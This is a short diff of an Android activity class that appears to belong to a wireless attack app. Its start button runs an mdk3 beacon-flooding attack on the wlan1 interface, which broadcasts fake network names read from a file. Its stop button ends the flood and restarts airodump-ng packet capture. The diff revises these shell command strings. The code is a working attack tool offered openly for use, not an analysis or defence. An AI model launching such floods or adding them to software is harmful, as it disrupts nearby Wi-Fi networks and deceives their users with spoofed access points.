@@ -45,14 +45,14 @@ public class AttackToggleOnOffOnly extends AppCompatActivity implements MyCallba
             @Override
             public void onClick(View v) {
                 Log.d("WALACH","KLIKNIETO");
-                new AttackToggleOnOffOnly.executeCommand(AttackToggleOnOffOnly.this, "killall kismet; killall airodump-ng; tmux new-session -d -s beaconFlood ‘mdk3 wlan1 b -a -s 100 -h -f /root/Desktop/fakeESSID.txt'","Beacon flooding attack launched","Started").execute();
+                new AttackToggleOnOffOnly.executeCommand(AttackToggleOnOffOnly.this, "tmux kill-session -t kismet; tmux kill-session -t airodump; tmux new-session -d -s beaconFlood 'mdk3 wlan1 b -v /root/Desktop/testESSID.txt -t -h'","Beacon flooding attack launched","Started").execute();
             }
         });
 
         endAttack.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                new AttackToggleOnOffOnly.executeCommand(AttackToggleOnOffOnly.this,"killall mdk3; tmux kill-session -t beaconFlood; airmon-ng start wlan1; airodump-ng wlan1 --output-format netxml -w /tmp/recent > /dev/null 2>&1","Beacon flooding attack terminated","Ended").execute();
+                new AttackToggleOnOffOnly.executeCommand(AttackToggleOnOffOnly.this,"tmux kill-session -t beaconFlood; tmux new-session -d -s airodump 'airodump-ng wlan1 --output-format netxml -w /tmp/recent'","Beacon flooding attack terminated","Ended").execute();
             }
         });
 
